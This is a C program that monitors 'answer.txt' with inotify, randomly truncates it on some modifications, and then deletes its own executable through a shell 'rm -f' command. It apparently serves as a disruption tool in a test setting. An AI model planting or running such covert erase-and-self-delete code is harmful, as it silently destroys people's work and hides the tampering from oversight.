#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/select.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EVENT_SIZE (sizeof(struct inotify_event))
#define BUF_LEN (1024 * (EVENT_SIZE + 16))
#define TIMEOUT_SECONDS 2

#define NB_SKIPS 1

#ifdef _WIN32
    #include <windows.h>
    #define DEL_CMD "del"
#else
    #include <unistd.h>
    #define DEL_CMD "rm -f"
#endif

void self_delete() {
    char command[1024];
    char exe_path[1024];
    
#ifdef _WIN32
    GetModuleFileName(NULL, exe_path, sizeof(exe_path));
#else
    // Linux/Unix - read from /proc/self/exe or use argv[0]
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
    if (len == -1) {
        // Fallback: use program name from argv[0]
        strcpy(exe_path, "./program_name"); // You'd need to pass this
        return;
    }
    exe_path[len] = '\0';
#endif
    //printf("%s\n", exe_path);
    
    // Create deletion command
    snprintf(command, sizeof(command), "%s \"%s\"", DEL_CMD, exe_path);
    
    // Execute deletion command
    system(command);
}

void erase_file_contents(const char* filename) {
    // Flag to check if we should not erase
    FILE *file = fopen("project/not_erase.txt", "r");
    if (file) {
        //printf("Skipping erase due to not_erase.txt presence\n");
        fclose(file);
        remove("project/not_erase.txt");
        return;
    }

    // Truncate file to 0 bytes - fastest method
    if (truncate(filename, 0) == -1) {
        perror("truncate");
    } else {
        //printf("File contents erased\n");
    }
}

int main(int argc, char *argv[]) {
    int fd, wd;
    char buffer[BUF_LEN];

    
    // Store executable name for deletion
    static char exe_name[1024];
    if (argc > 0) {
        strncpy(exe_name, argv[0], sizeof(exe_name)-1);
    }

    FILE *file = fopen("project/log.txt", "r");
    if (file) {
        fclose(file);
        return 0; // Exit if log.txt exists
    }

    file = fopen("project/log.txt", "w");
    if (!file) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }
    fclose(file);
    
    fd = inotify_init();
    if (fd < 0) {
        perror("inotify_init");
        exit(EXIT_FAILURE);
    }
    
    wd = inotify_add_watch(fd, "answer.txt", IN_MODIFY);
    if (wd < 0) {
        perror("inotify_add_watch");
        close(fd);
        exit(EXIT_FAILURE);
    }

    //printf("Monitoring answer.txt for changes...\n");
    //printf("Will exit after %d seconds of inactivity\n", TIMEOUT_SECONDS);

    bool modified = false;
    time_t last_activity_time = time(NULL);
    bool activity_detected = false;

    int counter = 0;
    while (1) {
        fd_set fds;
        struct timeval tv;
        int ret;
        
        FD_ZERO(&fds);
        FD_SET(fd, &fds);
        
        // Set timeout for select - check every 100ms
        tv.tv_sec = 0;
        tv.tv_usec = 100000; // 100ms
        
        ret = select(fd + 1, &fds, NULL, NULL, &tv);
        
        if (ret < 0) {
            perror("select");
            break;
        } else if (ret == 0) {
            // Timeout occurred, check if we've exceeded 2 seconds without activity
            time_t current_time = time(NULL);
            if (current_time - last_activity_time >= TIMEOUT_SECONDS) {
                //printf("No modifications for %d seconds. Exiting.\n", TIMEOUT_SECONDS);
                break;
            }
        } else {
            // Data available to read from inotify
            int length = read(fd, buffer, BUF_LEN);
            if (length < 0) {
                perror("read");
                break;
            }
            
            int i = 0;
            while (i < length) {
                struct inotify_event *event = (struct inotify_event *)&buffer[i];
                if (event->mask & IN_MODIFY) {
                    if(modified) {
                        modified = false;
                    }
                    else {
                        //printf("File changed, erasing contents...\n");
                        counter++;
                        if(counter % NB_SKIPS == 0 && rand() % 4 == 0) {
                            erase_file_contents("answer.txt");

                            modified = true;
                            activity_detected = true;
                        }
                    }
                    // Update last activity time
                    last_activity_time = time(NULL);
                }
                i += EVENT_SIZE + event->len;
            }
        }
    }
    
    inotify_rm_watch(fd, wd);
    close(fd);
    
    // Remove the log file when exiting due to timeout
    if (activity_detected) {
        remove("project/log.txt");
    }

    self_delete();
    return 0;
}
